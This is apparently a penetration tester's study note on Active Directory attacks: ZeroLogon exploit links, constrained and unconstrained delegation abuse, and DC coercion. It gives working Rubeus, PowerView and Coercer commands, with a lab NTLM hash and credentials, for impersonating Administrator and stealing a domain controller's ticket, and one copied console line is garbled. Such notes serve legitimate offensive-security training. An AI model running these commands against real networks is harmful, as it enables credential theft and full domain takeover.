
Most popular vulnerability in Active Directory
- ZeroLogon (Dangerous)
- PrintNightmare
- Sam the Admin
- Eternal Blue


Zerologons
https://www.trendmicro.com/en_us/what-is/zerologon.html
https://github.com/dirkjanm/CVE-2020-1472
https://github.com/SecuraBV/CVE-2020-1472

### Constrained Delegation:

“This service account is allowed to impersonate users
ONLY when talking to these specific services.”

If an attacker controls a service account trusted for constrained delegation, they can impersonate any user to specific services without knowing passwords.

Example:
Web service → HTTP service on Domain Controller
Web service → SQL service

These allowed services are stored in Active Directory attributes.

A service account (web_service)
Is trusted for constrained delegation
And gets compromised by an attacker

Now the attacker can:
Pretend to be the web_service account

Ask the KDC:
“Give me a ticket for user Administrator to Service HTTP/DC1”

KDC responds:

“Okay — you’re trusted.”

❌ No Administrator password required
❌ No login attempt detected
❌ Fully valid Kerberos ticket



> [!NOTE] Note
> The KDC does NOT require the user’s password when issuing a delegated ticket

```bash

Unblock-File .\PowerView-main.ps1
. .\PowerView-main.ps1
Get-NetUser -TrustedToAuth

.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt


C:\Users\bob\Downloads>I.\Rubeus. exe s4u /user:webservice /rc4: FCDC65703DD2BOBD789977F1F3EEAECF /domain: eagle. local
/impersonateuser : Administrator /msdsspn: "http/dc1" /dc: dcl. eagle. local /ptt

klist

Enter-PSSession dc1
```


### Unconstrained Delegation:
- Can impersonate any user
- Can access any service
- If compromised → domain compromise
![[Pasted image 20251010002449.png]]
![[Pasted image 20251010002500.png]]
```bash
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description

Get-NetUser -TrustedToAuth

Import-Module .\powerview.ps1
Get-NetComputer -Unconstrained

.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt


C:\Users\bob\Downloads>I.\Rubeus. exe s4u /user:webservice /rc4: FCDC65703DD2BOBD789977F1F3EEAECF /domain: eagle. local
/impersonateuser : Administrator /msdsspn: "http/dc1" /dc: dcl. eagle. local /ptt

klist

Enter-PSSession dc1

.\Rubeus.exe monitor /monitorinterval:5 /targetuser:HYDRA-DC$ /nowrap 


Invoke-WebRequest http://HYDRA-DC.MARVEL.local -UseDefaultCredentials -UseBasicParsing
```

### Coercing Attacks & Unconstrained Delegation
A coercing attack forces a Domain Controller (DC) to authenticate to a machine chosen by the attacker.
If that machine is configured with Unconstrained Delegation, it will store the DC’s Kerberos TGT in memory.
The attacker then extracts that TGT and can impersonate the DC, allowing full domain compromise (DCSync, DA access) — without cracking passwords.

Find machines with Unconstrained Delegation
(attacker already has domain user access)
```bash
Get-NetComputer -Unconstrained | select samaccountname
```

🔹 Goal: Find a machine that stores incoming Kerberos tickets
🔹 Example result:
```bash
SERVER01$
WS001$
DC1$
```

Start listening for Kerberos tickets on the delegated machine
(attacker has admin on WS001)
```bash
.\Rubeus.exe monitor /interval:1
```
🔹 Goal: Wait for a DC TGT to appear in memory

Force (coerce) the Domain Controller to authenticate
(run from attacker machine)
```bash
Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
```
What happens:
DC1 is forced to authenticate to WS001
DC1 sends its Kerberos TGT
WS001 stores it (because of Unconstrained Delegation)

4️⃣ Extract & use the DC TGT
(back on WS001)
Rubeus shows something like:
```bash
ServiceName : krbtgt/eagle.local
UserName    : DC1$
```
Now you can:
```bash
.\Rubeus.exe ptt /ticket:DC1.kirbi
```
You are now effectively the Domain Controller

One-line memory rule:
Coercion forces the DC to log in, Unconstrained Delegation saves the ticket, attacker steals it and becomes the domain.